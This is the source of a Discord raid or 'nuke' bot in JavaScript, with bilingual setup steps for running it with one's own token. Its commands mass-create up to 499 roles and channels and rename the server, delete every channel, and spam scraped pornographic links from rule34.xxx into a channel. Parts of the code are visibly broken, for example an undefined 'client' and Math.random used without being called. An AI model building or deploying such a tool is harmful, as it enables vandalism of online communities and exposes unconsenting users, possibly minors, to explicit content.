/* como usar vc mesmo / how to use by yourself
   1: https://discord.com/developers/applications e crie um novo app / this site on the side and make a new app
   2: clique no botão "bot" ao lado e clique em "add bot" e confirme / click on the "bot" button on the side and click on the "add bot" and confirm
   3: na parte escrita "token" clique em "copy" / on the token part click on the "copy" button
   4: na parte escrita "client.login(process.env.BOT_TOKEN);" neste arquivo, mude o process.env.BOT_TOKEN pelo seu token entre " " / on the client.login(process.env.BOT_TOKEN); part of this file, change the process.env.BOT_TOKEN to your token between " "
   5: na parte escrito client.user.setActivity, apenas apague tudo na linha / on the client.user.setActivity, just erase the whole row
   6: nas duas linhas q estão escrito "process.env.SERVER_NAME +" apenas apague isso (não a linha inteira, apenas isso) / on both rows that has the "process.env.SERVER_NAME +", just erase this part (not the whole row)
   7: instale o node.js e execute o exec me.bat na pasta / install node.js and execute the exec me.bat
   8: crie um arquivo .txt na pasta do bot e renomeie ela para qualquer nome final .bat (não pode ser tipo nome.bat.txt, tem q ser nome.bat) / on the bot path, make a file and rename it to anything .bat (it must be name.bat, not name.bat.txt)
   9: edite o arquivo e escreva apenas "node bot.js" (sem as aspas) e salve o arquivo / edit the file and write "node bot.js" (without the ")
   10: execute e gg / execute and gg
   
   -mene padero
   
  */


const { Client, Attachment } = require("discord.js");
const bot = new Client();
const cheerio = require("cheerio")
const request = require("request")
const prefix = '!!';

bot.on("ready", () => { 
    console.log(`Defoko 2.1`)
    console.log(`prontuh, creditor al le mene padero`)
    client.user.setActivity(process.env.STATUS);
});

bot.on("message", async (message) => {
    const server = message.guild.channels;
    let args = message.content.substring(prefix.length).split(" ");

    function makeid(length) { //peguei do stack overflow n lembro onde
        let result = ' ';
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+{}:"<>?`~./|\;,';
        const charactersLength = characters.length;
        let i;
        for(i = 0; i < length; i++){
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }
    function emoji(id){
	 return bot.emojis.get(id).toString();
    }
    function randmizr(min, max){
	 let step1 = max - min + 1;
	 let step2 = Math.random * step1;
	 let result = Math.floor(step2) + min;
	 return result;
    }
    function image(){
	let randomstuff = ['anal', 'futa', 'furry', 'cum', 'breasts', '1boy', '1girls', 'male', 'female', 'gay'];
	let randomcategory = randmizr(0, randomstuff.length-1);
	let tag = randomstuff[randomcategory];
	let options = {
	     url: "https://rule34.xxx/index.php?page=post&s=list&tags=" + tag,
	     method: "GET",
	     headers: {
		 "Accept": "text/html",
		 "User-Agent": "Chrome"
	     }
	};
	request(options, function(error, response, responseBody) {
        if (error) {
            return message.channel.send(`Erro eee ${error}`);
        }
 
 
        $ = cheerio.load(responseBody);
 
 
        var links = $(".image a.link");
 
        var urls = new Array(links.length).fill(0).map((v, i) => links.eq(i).attr("href"));
       
        console.log(urls);
 
        if (!urls.length) {
           
            return;
        }
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
	
	}
    });
    
    switch (args[0]) {
       case 'lol':
       message.delete();
       let i;
       console.log(`ser humano falou ae meu parcero fode tudo ae men`)
       message.guild.setIcon('./icon.png') 
	message.channel.send(`discord tem limite de 500 canais e 200 cargos, n reclama se não criar mais canais, da !!del pra apagar tudo mas com lag fudido`)
	for(i = 0; i < 499; i++){
		message.guild.createRole('nibbaa')
		const texto = makeid(32);
	    	message.guild.setName(process.env.SERVER_NAME + `${texto}`)
	    	message.guild.createChannel(`${texto}`, 'text');
	    	message.guild.createChannel(`${texto}`, 'voice');  
	    	message.guild.setIcon('./icon.png') 
	}
       break;

       case 'del':
       console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
       message.delete();
       message.channel.send(`oia o lag`);
       server.deleteAll();
       message.guild.setIcon('./icon.png') 
       const texth = makeid(32);
       message.guild.createChannel(`${texth}`, 'text');	
       message.guild.setName(process.env.SERVER_NAME + `${texth}`)
       message.guild.setIcon('./icon.png')  
       break;

       case 'r34bomb':
	    /* ALERTAA / ALERT 
	    	ESTE COMANDO É UM COMANDO NSFW
		SE VC É DE MENOR SAIA
		--------------
		IF YOUR UNDERAGE GET OUT OF HERE
		THIS IS A NSFW COMMAND
	    */
	    message.channel.send(`HentaiBomb em 2 segundos, fechem os olhos crianças ` + emoji("616026244823384065"))
	    image()
       break; 
    }
}});

bot.login(process.env.BOT_TOKEN);

//para de olhar aqui poha
//- mene padero
